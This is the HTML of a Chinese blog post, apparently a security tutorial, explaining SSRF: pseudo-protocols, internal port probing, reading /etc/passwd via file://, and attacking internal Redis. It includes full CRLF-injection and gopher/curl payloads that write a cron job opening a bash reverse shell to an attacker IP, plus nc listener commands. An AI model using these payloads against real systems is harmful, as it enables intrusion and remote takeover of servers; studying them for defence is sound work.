@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-3232cloud.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-1616cloud.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/cloud.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="SSRF官方解释SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。 漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。 攻击场景 可以对外网、服务器内网、本地进行端口扫描，获取一些服务的banner信息。 攻击">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF">
+<meta property="og:url" content="http://example.com/2021/08/08/SSRF/index.html">
+<meta property="og:site_name" content="云">
+<meta property="og:description" content="SSRF官方解释SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。 漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。 攻击场景 可以对外网、服务器内网、本地进行端口扫描，获取一些服务的banner信息。 攻击">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-08-08T07:53:32.543Z">
+<meta property="article:modified_time" content="2021-08-09T01:51:07.298Z">
+<meta property="article:author" content="sunyyer">
+<meta property="article:tag" content="生活">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2021/08/08/SSRF/"/>
+
+
+
+
+
+  <title>SSRF | 云</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">云</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">雨声潺潺,像住在溪边,宁愿天天下雨,以为你是下雨不来</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/08/08/SSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="云">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SSRF</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-08-08T15:53:32+08:00">
+                2021-08-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="官方解释"><a href="#官方解释" class="headerlink" title="官方解释"></a>官方解释</h2><p>SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</p>
+<p>漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p>
+<h3 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h3><ul>
+<li>可以对外网、服务器内网、本地进行端口扫描，获取一些服务的banner信息。</li>
+<li>攻击运行在内网或本地的应用程序（例如溢出）</li>
+<li>对内网的Web应用进行指纹识别，通过访问默认文件实现</li>
+<li>攻击内外网的Web应用，主要是使用GET参数就可以实现的攻击（例如struts2、sqli等）</li>
+<li>利用file协议读取本地文件等</li>
+</ul>
+<hr>
+<h2 id="SSRF漏洞可能出现的场景"><a href="#SSRF漏洞可能出现的场景" class="headerlink" title="SSRF漏洞可能出现的场景"></a>SSRF漏洞可能出现的场景</h2><ul>
+<li>能够对外发起网络请求的地方。</li>
+<li>从远程服务器请求资源（upload、import、export rss feed）</li>
+<li>数据库内置功能</li>
+<li>webmail收取其他邮箱的邮件</li>
+<li>文件处理、编码处理、属性信息处理（ffmpeg、imagemagic、docx、pdf、XML）<h3 id="后端常用函数造成此漏洞"><a href="#后端常用函数造成此漏洞" class="headerlink" title="后端常用函数造成此漏洞"></a>后端常用函数造成此漏洞</h3></li>
+<li>file-get-contents()</li>
+<li>fsockopen()</li>
+<li>curl_exec()</li>
+</ul>
+<h3 id="组织SSRF漏洞利用的场景"><a href="#组织SSRF漏洞利用的场景" class="headerlink" title="组织SSRF漏洞利用的场景"></a>组织SSRF漏洞利用的场景</h3><ul>
+<li>服务器开启 OpenSSL 无法进行交互利用</li>
+<li>服务端需要鉴权（Cookies &amp; User：Pass）不能完美利用</li>
+<li>限制请求的端口为 http常用的端口，比如，80,443,8080,8090。</li>
+<li>禁用不需要的协议。仅仅允许http和https请求。可以防止类似于 file:///,gopher://,ftp:// 等引起的问题。</li>
+<li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态<h2 id="SSRF伪协议"><a href="#SSRF伪协议" class="headerlink" title="SSRF伪协议"></a>SSRF伪协议</h2><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:///</span><br><span class="line">dict:///</span><br><span class="line">sftp:///</span><br><span class="line">ldap:///</span><br><span class="line">tftp:///</span><br><span class="line">gopher:///</span><br></pre></td></tr></table></figure>
+<ul>
+<li>file:///</li>
+</ul>
+<p>这种url schema 可以尝试从文件系统中获取文件，读取文件协议</p>
+<ul>
+<li>dict:///</li>
+</ul>
+<p>这种URL Scheme常用于探测端口，版本信息。比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://xxxx:port/info</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>sftp:///</li>
+</ul>
+<p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
+<ul>
+<li>ldap:///</li>
+</ul>
+<p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
+<ul>
+<li>tftp:///</li>
+</ul>
+<p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
+<ul>
+<li>gopher:///</li>
+</ul>
+<p>Gopher支持GET&amp;POST请求，同时在攻击内网中有极大作用利用此协议访问redis反弹shell。对目标攻击的主要协议，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://xxxx:port/主体 主体部分需要URL编码</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="支持测探的协议"><a href="#支持测探的协议" class="headerlink" title="支持测探的协议"></a>支持测探的协议</h3><ul>
+<li>gopher://<host>:<post>/<gopher-path>_后面接TCP数据流（扫描）</li>
+<li>dict://xxxxx:port/info（例:dict://xxxxx:22/info，dict://xxxxx:6379/info）（爆破）</li>
+<li>ftp:///etc/passwd（file://c:\windows\win.ini，如果报错返回绝对地址更再好不过了）</li>
+<li>http:// xxxxx:port/（扫描）</li>
+<li>file://（读取文件内容）</li>
+</ul>
+<hr>
+<h2 id="ssrf针对内网探测、打redis的漏洞实例"><a href="#ssrf针对内网探测、打redis的漏洞实例" class="headerlink" title="ssrf针对内网探测、打redis的漏洞实例"></a>ssrf针对内网探测、打redis的漏洞实例</h2><h3 id="进行内网探测"><a href="#进行内网探测" class="headerlink" title="进行内网探测"></a>进行内网探测</h3><p> 利用http协议对内网进行探测，探测整个内网的存活ip，和端口，如果要针对redis，那么这一步主要是找开启了6379端口的内网ip地址。</p>
+<p>可利用bp或者脚本进行快速探测，由于回显的不同，脚本就需要按照回显的特征来写，那种回显是存在，哪种回显是不存在这样的ip或端口。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.xx.xx/xx/xx.php?url=http://172.21.0.2:6379</span><br></pre></td></tr></table></figure>
+<h3 id="file协议读取文件"><a href="#file协议读取文件" class="headerlink" title="file协议读取文件"></a>file协议读取文件</h3><p>这个协议可以读取系统的一些存放密码的文件，比如说linux的/etc/passwd或者windows的C:/windows/win.ini 等，或者说ctf中的flag文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.xx.xx/xx/xx.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>
+<h3 id="攻击redis"><a href="#攻击redis" class="headerlink" title="攻击redis"></a>攻击redis</h3><ul>
+<li>只要知道内网有开启6379的redis服务（或许是其他端口开放的此服务），那么就可以利用目标机进行攻击redis了。<ul>
+<li>第一步探测Redis我们已经完成了，那么第二部就是发送redis命令，将弹shell脚本写入/etc/crontab中，crontab就是linux下的一个定时执行事件的一个程序。</li>
+<li>还有两个定时服务文件是  /var/spool/cron/root 和  /var/spool/cron/crontabs/root。针对这三个路径的不同，如下会进行讲解。<h3 id="通过header-CRLF注入"><a href="#通过header-CRLF注入" class="headerlink" title="通过header CRLF注入"></a>通过header CRLF注入</h3></li>
+</ul>
+</li>
+<li>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</li>
+<li>命令如下</li>
+<li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">test</span><br><span class="line"> </span><br><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/公网ip/监听端口 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br><span class="line"> </span><br><span class="line">aaa</span><br></pre></td></tr></table></figure>
+这里是采用的bash反弹，在ubuntu下不会反弹成功，CentOS可以反弹成功；路径采用的是/etc/crontab.</li>
+</ul>
+<p>因为我们是通过GET来发送命令的，因此要将上面的命令进行URL编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http://xxx.xxx.xx.xx/xx/xx.php?url=http://172.21.0.2:6379/</span><br><span class="line">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.220.140%2F2333%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure>
+<p>然后在自己的公网机上nc监听2333端口就可以了。</p>
+<h3 id="通过curl命令和gopher协议远程攻击内网redis"><a href="#通过curl命令和gopher协议远程攻击内网redis" class="headerlink" title="通过curl命令和gopher协议远程攻击内网redis"></a>通过<em>curl</em>命令和<em>gopher</em>协议远程攻击内网redis</h3><p>gopher协议是比http协议更早出现的协议，现在已经不常用了，但是在SSRF漏洞利用中gopher可以说是万金油，因为可以使用gopher发送各种格式的请求包，这样就可以解决漏洞点不在GET参数的问题了。</p>
+<p>gopher协议可配合linux下的curl命令伪造POST请求包发给内网主机。此种方法能攻击成功的前提条件是：redis是以root权限运行的。</p>
+<p>[payload]如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -v &#x27;http://xxx.xxx.xx.xx/xx.php?url=</span><br><span class="line">gopher://172.21.0.2:6379/</span><br><span class="line">_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.220.140%2f2333%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>redis命令进行了两次url编码，这里是通过gopher协议伪造的请求包用curl命令来发送；</p>
+<p>payload采用的是bash反弹，定时程序路径是/var/spool/cron/root</p>
+<p>发送请求之前在公网机192.168.220.140开启nc监听端口2333</p>
+<p>nc -lvp 2333 （或nc -l 2333）</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/08/06/%E4%B8%80%E6%AC%A1%E6%AF%94%E8%BE%83%E5%AE%8C%E6%95%B4%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="next" title="一次比较完整的信息收集">
+                <i class="fa fa-chevron-left"></i> 一次比较完整的信息收集
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF"><span class="nav-number">1.</span> <span class="nav-text">SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%98%E6%96%B9%E8%A7%A3%E9%87%8A"><span class="nav-number">1.1.</span> <span class="nav-text">官方解释</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF"><span class="nav-number">1.1.1.</span> <span class="nav-text">攻击场景</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%83%BD%E5%87%BA%E7%8E%B0%E7%9A%84%E5%9C%BA%E6%99%AF"><span class="nav-number">1.2.</span> <span class="nav-text">SSRF漏洞可能出现的场景</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E9%80%A0%E6%88%90%E6%AD%A4%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.1.</span> <span class="nav-text">后端常用函数造成此漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%84%E7%BB%87SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E5%9C%BA%E6%99%AF"><span class="nav-number">1.2.2.</span> <span class="nav-text">组织SSRF漏洞利用的场景</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.3.</span> <span class="nav-text">SSRF伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.3.1.</span> <span class="nav-text">类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%AF%E6%8C%81%E6%B5%8B%E6%8E%A2%E7%9A%84%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.3.2.</span> <span class="nav-text">支持测探的协议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssrf%E9%92%88%E5%AF%B9%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B%E3%80%81%E6%89%93redis%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B"><span class="nav-number">1.4.</span> <span class="nav-text">ssrf针对内网探测、打redis的漏洞实例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="nav-number">1.4.1.</span> <span class="nav-text">进行内网探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#file%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">1.4.2.</span> <span class="nav-text">file协议读取文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BBredis"><span class="nav-number">1.4.3.</span> <span class="nav-text">攻击redis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87header-CRLF%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.4.</span> <span class="nav-text">通过header CRLF注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87curl%E5%91%BD%E4%BB%A4%E5%92%8Cgopher%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91redis"><span class="nav-number">1.4.5.</span> <span class="nav-text">通过curl命令和gopher协议远程攻击内网redis</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sunyyer</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show.js"></script>
+<!--显示标签栏标题 -->
+<script type="text/javascript" src="/js/funnytitle.js"></script>
+<!--动态线条背景-->
+<script type="text/javascript"
+color="112,128,144" opacity='1' zIndex="-2" count="140" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+<!--背景下雪-->
+<script type="text/javascript" src="/js/snow.js"></script>
